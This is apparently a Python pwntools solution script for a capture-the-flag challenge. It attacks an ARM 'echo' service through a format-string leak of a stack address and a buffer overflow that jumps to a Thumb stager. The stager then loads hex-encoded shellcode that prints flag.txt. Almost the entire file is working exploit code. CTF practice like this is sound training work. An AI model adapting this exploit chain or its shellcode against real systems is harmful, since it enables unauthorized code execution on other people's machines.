#!/usr/bin/env python3
from pwn import *

HOST = "challs.squ1rrel.dev"
PORT = 5003

# 12-byte thumb stager:
# read(0, sp, 0xfe)
STAGER = bytes.fromhex("002069467f225200032700df")

# Thumb shellcode to cat flag.txt (generated once with pwntools shellcraft.cat)
STAGE2 = bytes.fromhex(
    "87ea070780b4dff8047001e02e747874"
    "80b4dff8047001e0666c616780b46846"
    "81ea01014ff0050741df05464ff00100"
    "294682ea02026ff000434ff0bb0741df"
)

# Remote calibration: buf_addr = leak(%13$p) - 0x18c
LEAK_TO_BUF = 0x18C

def exploit(io):
    io.recvuntil(b"Echo\n")

    # Leak a stable stack-ish pointer via format string
    io.send(b"%13$p\n")
    leak = int(io.recvline().strip(), 16)
    buf_addr = leak - LEAK_TO_BUF

    log.info(f"leak      = {hex(leak)}")
    log.info(f"buf_addr  = {hex(buf_addr)}")

    # Overflow via read(0, buf, 0x10), set PC -> buf+1 (thumb)
    payload = STAGER + p32(buf_addr + 1)
    io.send(payload)

    # Stager now reads stage2 onto stack and executes it
    io.send(STAGE2)

    # shellcode prints flag and exits
    return io.recvrepeat(2)


def main():
    context.log_level = "info"

    if args.LOCAL:
        io = process(["qemu-arm", "-L", "armroot/sysroot", "./echo"])
    else:
        io = remote(HOST, PORT)

    data = exploit(io)
    if data:
        print(data.decode("latin1", "ignore"), end="")
    io.close()


if __name__ == "__main__":
    main()
